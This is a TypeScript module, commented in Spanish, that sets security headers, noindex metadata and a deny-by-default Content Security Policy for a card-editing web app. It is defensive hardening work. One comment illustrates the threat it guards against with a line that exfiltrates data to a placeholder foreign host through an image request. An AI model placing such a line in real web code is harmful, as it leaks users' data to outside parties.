/**
 * Candados de cabecera (unidad 1e del PRP-TD-001). Fuente unica de los headers.
 *
 * Corren SIEMPRE, exista o no el link compartible de la Ola 6: lo que protegen es el
 * `localStorage`, que existe con link o sin el. Por eso viven aqui y no colgando de la Ola 6
 * (correccion del debate adversarial, objecion B3 del PRP).
 *
 * La landing de referencia (`Personal landing page/next.config.ts:21-43`) NO tiene CSP: copiarla
 * sin mas dejaria este producto sin ninguna.
 */

/** Rutas que muestran o editan datos de una tarjeta. No se indexan. */
export const RUTAS_TARJETA = ['/t', '/tarjeta', '/editor'] as const

/**
 * `noindex` para la vista de tarjeta. Los buscadores ignoran el fragmento de la URL (`#payload`),
 * asi que solo indexarian la ruta pelada; se cierra igual de forma explicita.
 * Las paginas de la Ola 2 y 3 ademas exportan `metadataNoindex` (abajo) en su `metadata`.
 */
export const X_ROBOTS_TAG_TARJETA = 'noindex, nofollow, noarchive'

/** Para el `export const metadata` de las paginas de tarjeta (Olas 2, 3 y 6). */
export const metadataNoindex = {
  robots: { index: false, follow: false, nocache: true },
} as const

/**
 * Cabeceras estaticas, iguales en toda la app. Se sirven desde `next.config.ts`.
 *
 * `Referrer-Policy: no-referrer` (la landing usa `strict-origin-when-cross-origin`): el fragmento
 * de la URL no viaja en el `Referer` de todos modos, pero se cierra igual por si un enlace saliente
 * lo llevara.
 *
 * `X-Frame-Options: DENY` es decision, no accidente: la tarjeta no se puede embeber en ningun lado.
 */
export const CABECERAS_ESTATICAS = [
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'no-referrer' },
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains' },
  // Esta app no usa camara, microfono ni ubicacion. La foto (G5) entra por un <input type="file">,
  // que no necesita el permiso de camara.
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
] as const

/**
 * Construye la CSP. **Arranca en `default-src 'self'` a proposito: deny by default.**
 * No basta con listar `script-src` y `connect-src`; un `new Image().src = 'https://ajeno/?d=' + datos`
 * exfiltra por `img-src` y no lo gobierna ninguna de las dos (PRP seccion 9).
 *
 * @param nonce nonce por peticion, generado en `src/proxy.ts`. Next lo aplica solo a sus propios
 *              scripts leyendo esta misma cabecera.
 * @param dev   en desarrollo Next necesita `'unsafe-eval'` para el refresh rapido.
 */
export function construirCsp(nonce: string, dev: boolean): string {
  const directivas = [
    // deny by default: todo lo que no se nombre abajo cae aqui
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'${dev ? " 'unsafe-eval'" : ''}`,
    // `data:` y `blob:` son locales al navegador: sirven la foto (G5) y el .jpeg exportado (Ola 5)
    // sin abrir ninguna salida a un dominio ajeno
    `img-src 'self' data: blob:`,
    // Tailwind emite una hoja propia, pero Next inyecta estilos en linea en el arranque
    `style-src 'self' 'unsafe-inline'`,
    `font-src 'self'`,
    // sin dominios ajenos: no hay analitica, ni widgets, ni CDN (criterio de exito, unidad 7e)
    `connect-src 'self'`,
    `object-src 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
    `frame-ancestors 'none'`,
    `frame-src 'none'`,
    `worker-src 'self' blob:`,
    `manifest-src 'self'`,
  ]
  if (!dev) directivas.push('upgrade-insecure-requests')
  return directivas.join('; ')
}

/** ¿Esta ruta muestra o edita datos de una tarjeta? */
export function esRutaDeTarjeta(pathname: string): boolean {
  return RUTAS_TARJETA.some((r) => pathname === r || pathname.startsWith(`${r}/`))
}
